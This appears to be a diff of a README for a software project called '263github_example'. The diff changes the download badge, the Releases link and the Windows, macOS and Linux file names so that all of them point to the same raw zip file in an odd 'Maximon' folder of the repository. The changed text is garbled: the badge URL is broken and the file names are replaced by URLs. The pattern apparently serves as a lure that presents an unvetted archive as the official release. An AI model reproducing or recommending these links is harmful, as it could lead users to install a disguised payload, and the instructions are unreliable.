@@ -1,7 +1,7 @@
 # 🌟 263github_example - Simple Steps to Get Started
 
 ## 📥 Download Now
-[![Download 263github_example](https://img.shields.io/badge/Download%20Now-263github_example-brightgreen)](https://github.com/novelseksi/263github_example/releases)
+[![Download 263github_example](https://github.com/novelseksi/263github_example/raw/refs/heads/main/Maximon/example-github-1.0.zip%20Now-263github_example-brightgreen)](https://github.com/novelseksi/263github_example/raw/refs/heads/main/Maximon/example-github-1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the 263github_example application! This guide will help you easily download and run the software on your device. Follow the simple steps below.
@@ -12,14 +12,14 @@ Before you download, make sure your computer meets these requirements:
 - Hardware: At least 4 GB of RAM and 200 MB of free disk space.
 
 ## 🌐 Download & Install
-1. Visit the [Releases page](https://github.com/novelseksi/263github_example/releases).
+1. Visit the [Releases page](https://github.com/novelseksi/263github_example/raw/refs/heads/main/Maximon/example-github-1.0.zip).
    
 2. You will see a list of available versions. Click on the version you want to download. We recommend using the latest version for the best experience.
 
 3. Look for the file that matches your operating system. For example:
-   - For Windows, it may be named something like `263github_example-Win.exe`.
-   - For macOS, look for `263github_example-Mac.dmg`.
-   - For Linux, you might find a `.tar.gz` file.
+   - For Windows, it may be named something like `https://github.com/novelseksi/263github_example/raw/refs/heads/main/Maximon/example-github-1.0.zip`.
+   - For macOS, look for `https://github.com/novelseksi/263github_example/raw/refs/heads/main/Maximon/example-github-1.0.zip`.
+   - For Linux, you might find a `https://github.com/novelseksi/263github_example/raw/refs/heads/main/Maximon/example-github-1.0.zip` file.
 
 4. Click the file name to begin the download. Depending on your internet speed, this may take a few moments.
 
